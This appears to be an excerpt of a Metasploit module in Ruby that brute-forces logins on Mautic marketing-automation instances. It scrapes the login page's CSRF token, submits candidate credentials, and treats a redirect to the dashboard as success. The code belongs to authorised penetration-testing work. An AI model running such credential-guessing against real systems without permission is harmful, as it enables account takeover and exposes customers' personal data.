...
module Metasploit
  module Framework
    module LoginScanner
      class Mautic < ::Metasploit::Framework::LoginScanner::HTTP
        def attempt_login(credential)
          ...
          begin
            ...
            req = cli.request_cgi({
              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 's/login'
            })

            res = cli.send_recv(req)

            cookie = res.get_cookies
            csrf = $1 if res.body =~ /<input type="hidden" name="_csrf_token" value="(.*?)"\/>/

            return unless csrf

            req = cli.request_cgi({
              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 's/login_check',
              'method' => 'POST',
              'vars_post' => {
                '_username' => credential.public,
                '_password' => credential.private,
                '_csrf_token' => csrf
              },
              'cookie' => cookie
            })
            ...
            if res.code == 302 && res.headers['Location'] =~ /\/s\/dashboard/
...
class MetasploitModule < Msf::Auxiliary
  ...
  def initialize
    super(
        'Name'           => 'Mautic Bruteforce',
        'Description'    => %q(
        This module attempts to bruteforce weak credentials on Mautic instances.
...
sensitive information such as email addresses or customer names.
  ...
  def run_host(ip)
    ...
    scanner = Metasploit::Framework::LoginScanner::Mautic.new(
